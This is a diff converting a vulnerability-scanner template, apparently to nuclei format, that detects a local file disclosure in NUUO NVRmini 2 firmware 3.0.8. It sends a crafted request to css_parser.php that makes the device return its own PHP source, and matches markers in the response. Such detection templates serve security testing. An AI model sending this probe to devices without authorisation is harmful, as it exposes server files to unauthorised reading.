@@ -1,14 +1,26 @@
-id: nuuo-file-inclusion
-
+id: nuuo-file-inclusion.yaml
 info:
-    name: Nuuo file inclusion
-    author: 2357000166(https://github.com/2357000166)
-    severity: high
+  name: NUUO NVRmini 2 3.0.8 Local File Disclosure
+  author: princechaddha
+  severity: high
+  reference: https://www.exploit-db.com/exploits/40211
+  tags: nuuo,lfi
 
-rules:
-    r0:
-        request:
-            method: GET
-            path: /css_parser.php?css=css_parser.php
-        expression: response.status == 200 && response.headers["content-type"] == "text/css" && response.body.bcontains(b"$_GET['css']")
-expression: r0()
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/css_parser.php?css=css_parser.php"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "$_GET['css']"
+        part: body
+      - type: word
+        words:
+          - "text/css"
+        part: header
+      - type: status
+        status:
+          - 200
